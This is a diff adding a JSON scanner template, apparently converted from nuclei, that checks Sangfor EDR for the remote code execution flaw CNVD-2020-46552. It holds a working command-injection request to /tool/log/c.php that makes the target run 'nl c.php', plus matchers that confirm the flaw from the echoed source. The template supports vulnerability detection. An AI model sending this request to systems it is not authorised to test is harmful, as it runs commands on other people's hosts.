@@ -1,0 +1,132 @@
+{
+  "id": "CNVD-2020-46552",
+  "name": "Sangfor EDR - Remote Code Execution",
+  "author": "ritikchaddha",
+  "severity": "CRITICAL",
+  "description": "Sangfor Endpoint Monitoring and Response Platform (EDR) contains a remote code execution vulnerability. An attacker could exploit this vulnerability by constructing an HTTP request which could execute arbitrary commands on the target host.",
+  "references": [
+    "https://www.modb.pro/db/144475",
+    "https://blog.csdn.net/bigblue00/article/details/108434009",
+    "https://cn-sec.com/archives/721509.html"
+  ],
+  "tags": [
+    "cnvd",
+    "cnvd2020",
+    "sangfor",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/tool/log/c.php?strip_slashes\u003dprintf\u0026host\u003dnl+c.php",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(body, \"$show_input \u003d function($info)\")",
+            "contains(body, \"$strip_slashes($host)\")",
+            "contains(body, \"Log Helper\")",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2020-46552",
+    "info": {
+      "name": "Sangfor EDR - Remote Code Execution",
+      "author": "ritikchaddha",
+      "severity": "critical",
+      "description": "Sangfor Endpoint Monitoring and Response Platform (EDR) contains a remote code execution vulnerability. An attacker could exploit this vulnerability by constructing an HTTP request which could execute arbitrary commands on the target host.",
+      "reference": [
+        "https://www.modb.pro/db/144475",
+        "https://blog.csdn.net/bigblue00/article/details/108434009",
+        "https://cn-sec.com/archives/721509.html"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "cnvd,cnvd2020,sangfor,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/tool/log/c.php?strip_slashes\u003dprintf\u0026host\u003dnl+c.php"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(body, \"$show_input \u003d function($info)\")",
+              "contains(body, \"$strip_slashes($host)\")",
+              "contains(body, \"Log Helper\")",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
